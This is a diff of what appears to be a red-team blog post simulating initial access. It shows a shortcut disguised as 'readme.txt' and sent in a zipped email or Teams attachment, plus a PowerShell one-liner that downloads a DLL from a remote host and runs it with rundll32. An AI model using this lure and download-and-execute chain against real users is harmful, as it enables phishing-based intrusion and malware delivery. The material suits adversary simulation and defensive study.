@@ -77,7 +77,7 @@ C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h
 ```
 __Note:__ The powershell download can be also be performed with the usual suspect IEX Download String function. 🚩
 
-Futhermore, the above command is included inside the readme.lnk file which will look like this to the end user. 
+Futhermore, the above command is included inside the readme.txt.lnk file which will look like this to the end user. 
 
 Below we can see the files that will be displayed to the user after unziping the `.zip` folder delivered via email or when possible via Microsft Teams. 
 
@@ -111,6 +111,8 @@ With some modification on the `.dll` file we can also perform the same activity 
 C:\Windows\System32\cmd.exe /c powershell.exe wget http://192.168.133.152:1234/h.dll -OutFile %TMP%\h.dll && rundll32 %TMP%\h.dll,helo
 ```
 The command is pretty similar even though in this case we need to specify the export function name declared in our `.dll`
+
+Below is a quick video demonstrating our initial access scenario.
 
 <video src="/assets/posts/2022-06-01-Initial-Access-Simulation/hvc1.mp4" controls="controls" style="max-width: 1000px;">
 </video>
